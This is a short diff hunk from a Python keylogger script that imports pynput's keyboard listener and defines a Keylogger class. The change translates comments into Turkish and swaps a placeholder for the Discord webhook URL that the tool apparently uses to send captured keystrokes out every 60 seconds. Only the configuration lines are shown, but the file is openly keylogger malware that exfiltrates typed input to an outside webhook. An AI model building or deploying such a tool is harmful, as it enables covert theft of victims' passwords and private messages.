@@ -3,8 +3,8 @@ from threading import Timer
 from pynput.keyboard import Listener
 
 
-WEBHOOK_URL = 'your-custom-webhook-url'
-TIME_INTERVAL = 60  # Amount of time between each report, expressed in seconds.
+WEBHOOK_URL = 'webhook-url' # Discord webhook url'nizi girin.
+TIME_INTERVAL = 60  # Saniye cinsinden ifade edilen her rapor arasındaki süre.
 
 
 class Keylogger:
